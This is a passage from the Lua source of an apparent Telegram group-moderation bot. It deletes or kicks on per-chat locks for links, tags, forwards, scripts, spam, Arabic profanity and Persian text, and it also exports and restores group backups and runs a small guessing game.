if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     Source loolIQ     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevAbs:get(loolIQ..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     Source loolIQ     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevAbs:get(loolIQ..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     Source loolIQ     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevAbs:get(loolIQ..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     Source loolIQ     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if DevAbs:get(loolIQ.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:group:link"..msg.chat_id_
DevAbs:set(loolIQ..abs,glink)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 The new link has been created\nSend (link) to view the new link ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 تـۖم صـنـع ٱڵـرآبـط ٱڵـجـډيـډ\nٱرسـڵ (الرابط) ڵـعـړض ٱڵـرآبـط ٱڵـجـډيـډ ', 1, 'md')
end
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
DevAbs:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if DevAbs:get(loolIQ..'bot:bots:gkgk'..msg.chat_id_) and not is_admin(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
DevAbs:set(loolIQ..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(loolIQ..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local abs = 'bot:sens:spam'..msg.chat_id_
if not DevAbs:get(loolIQ..abs) then
sens = 400
else
sens = tonumber(DevAbs:get(loolIQ..abs))
end
if DevAbs:get(loolIQ..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
--     Source loolIQ     --
local msg = data.message_
text = msg.content_.text_
if text and is_monshid(msg.sender_user_id_, msg.chat_id_) then 
if DevAbs:get('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ تـۖم ٱڵـغـاء ٱلٱمـر', 1, 'md')
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "❗️☻ تـۖم ٱضٱفـة  *{ "..numadded..' }* رسٱئڵ ', 1, 'md')
end
end
--     Source loolIQ     --
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
end
end
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'fshaerdil' then
delete_msg(chat, msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ممنوع ٱڵـفشٱر هنا *', 1, 'md') 
elseif DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'fshaerdil2' then
delete_msg(chat, msgs)
end
end
end
--     Source loolIQ     --
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'thhhh' then
delete_msg(chat, msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ممنوع ٱڵتكلم بٱڵغة ٱڵفارسية هنا', 1, 'md')   
elseif DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'bedthhh' then
delete_msg(chat, msgs)
end
end
end
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end 
end
--     Source loolIQ     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
end 
end
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'kfrdil' then
delete_msg(chat, msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ممنوع ٱڵـكفر هنا *', 1, 'md') 
elseif DevAbs:get(loolIQ..'far'..msg.chat_id_) == 'kfrdil2' then
delete_msg(chat, msgs)
end
end
end
--     Source loolIQ     --
if text == 'جلب نسخه الكروبات' or text == 'النسخه الاحتياطيه' or text == 'نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
local list = DevAbs:smembers(loolIQ..'bot:groups')  
local t = '{"BOT_ID": '..loolIQ..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = DevAbs:get(loolIQ.."bot:group:link"..v) or ''
welcome = DevAbs:get(loolIQ..'welcome:'..v) or ''
MNSH = DevAbs:smembers(loolIQ..'abs:monsh:'..v)
MDER = DevAbs:smembers(loolIQ..'abs:owners:'..v)
MOD = DevAbs:smembers(loolIQ..'abs:admins'..v)
VIP = DevAbs:smembers(loolIQ..'abs:vipmem'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end

if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..loolIQ..'.json', '❗️🚸 ⌯ عدد كروبٱت ٱڵبوت : ('..#list..')',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
------------- END MSG CHECKS loolIQ --------------
if DevAbs:get(loolIQ.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"*❗️🚸 ⌯ يوجد فقط ( 6 ) ٱختيٱرٱت*\n*❗️🔑 ⌯ ٱرسـل ٱختيٱرك مـره ٱخرى*\n", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(loolIQ.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(loolIQ.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'\n*❗️☻ ٱڵـمحيبس بـٱڵـيد رقـم : { '..NUM..' } \n❗️🚸 ⌯ مبروك ڵقد ربحت وحصلت على ( 5 ) نقٱط يمكنك ٱستبدٱڵها بٱڵرسٱئڵ *', 1, "md") 
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(loolIQ.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'\n*❗️☻ ٱڵـمحيبس بـٱڵـيد رقـم : { '..GETNUM..' } \n❗️🚸 ⌯ ڵلٱسف ڵقد خسرت حٱوڵ مره ٱخرى ڵڵعثور على ٱڵمحيبس *', 1, "md")
end
end
end
if DevAbs:get(loolIQ.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:supports:link"
DevAbs:set(loolIQ..abs, glink)
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ *New Support link has been Saved*  ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ رآبـط كروب ٱڵډعم ٱڵجډيډ ", 1, "md")
end
DevAbs:del(loolIQ.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local abs = "bot:supports:link"
DevAbs:set(loolIQ..abs, bID)
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ *New Support Bot ID* has been *Saved* ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ معرف ٱڵډعم ٱڵجډيډ ", 1, "md")
end
DevAbs:del(loolIQ.."bot:support:link" .. msg.sender_user_id_)
end
end
if DevAbs:get(loolIQ..'DevAbs4'..msg.sender_user_id_) then
DevAbs:del(loolIQ..'DevAbs4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "*❗️🚸 ⌯ ڵم ترفعني ٱدمن في قنٱتك ٱرفعني ٱولٱ *\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️⚠️ ⌯ هذٱ ٱڵمعرف غير صحيح *\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
Dev_Abs(msg.chat_id_,msg.id_, 1, "*❗️⚠️ ⌯ هذٱ ٱڵمعرف غير صحيح *\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
DevAbs:set(loolIQ..'DevAbs3',CH_BOT)
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️🚸 ⌯ تـۖم حفظ قنٱة ٱلٱشترٱك \n❗️🔑 ⌯ قم بتفعيل الاشتراك الاجباري ٱلٱن \n ", 1 , "html")
return false
end
if DevAbs:get(loolIQ.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
local zakrf = text:match("(.*)")  
